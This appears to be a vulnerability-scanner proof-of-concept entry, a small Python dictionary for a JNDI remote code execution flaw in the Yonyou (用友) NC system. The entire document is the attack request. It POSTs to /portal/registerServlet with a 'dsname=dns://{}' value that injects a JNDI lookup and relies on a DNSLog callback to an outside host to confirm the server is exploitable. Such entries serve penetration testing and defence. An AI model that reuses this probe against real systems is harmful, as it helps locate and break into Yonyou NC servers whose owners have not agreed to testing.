{
        'name': '用友NC系统JNDI 远程代码执行漏洞(JNDI)',
        'poc':[{'requests':{
            'method': 'post',
            'payload': '/portal/registerServlet',
            'headers': {
                'User-Agent': 'Mozilla/5.0 (X11; CrOS i686 3912.101.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.116 Safari/537.36',
                'Content-Type': 'application/x-www-form-urlencoded'
            },
            'data': """type=1&dsname=dns://{}""",
            'dnslog': True,
            'sqltime': False,
        },
        'response': {
            'status_code': False,
            'text': False
        }}]
    }